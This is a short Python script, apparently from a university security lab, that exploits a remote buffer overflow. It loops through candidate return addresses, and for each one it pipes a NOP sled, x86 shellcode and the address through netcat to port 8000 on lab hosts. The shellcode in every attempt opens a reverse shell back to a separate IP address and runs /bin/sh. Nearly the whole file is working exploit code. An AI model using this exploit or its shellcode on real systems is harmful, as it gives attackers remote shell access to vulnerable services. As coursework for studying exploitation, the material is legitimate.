#!/usr/bin/python
#Author: Shraddha Mhatre
#Reference: https://www.exploit-db.com/docs/english/13088-explanation-of-a-remote-buffer-overflow-vulnerability.pdf
#Reference: https://samsclass.info/127/proj/p3-lbuf1.htm

import os

shellcode = "\x81\xc4\x54\xf2\xff\xff\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\xc0\xa8\x39\x03\x66\x68\x1F\x40\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

nopsled = '\x90' * 222

huskyid = '021'

return_address1 = '\x00'
return_address2 = '0xd0'
#return_address = '\x00\xd0'



#for first part of the address
for j in range(208,224):
        for i in range(0, 256):
                return_address = hex(j) + hex(i)
                return_address = return_address.replace("0x","\\x")
                #print(return_address)
                #print huskyid + nopsled + "\x90" + shellcode + nopsled + str(return_address) + "\xff\xff"
                #os.system("print huskyid + nopsled + "\x90 * 2" + shellcode + nopsled + return_address + "\xff\xff" | nc -v -v bandit 8000")
                os.system(" python -c 'print \"021\" ; print \"\x90\" * 249 ; print \"\x68\xc0\xA8\x39\x03\x5e\x66\x68\x1E\x61\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xce\" ; print \"\x90\" * 200 ; print \""+return_address+"\xff\xff\"' | nc -v -v gangsta 8000")
#| nc -v -v 192.168.57.4 8000
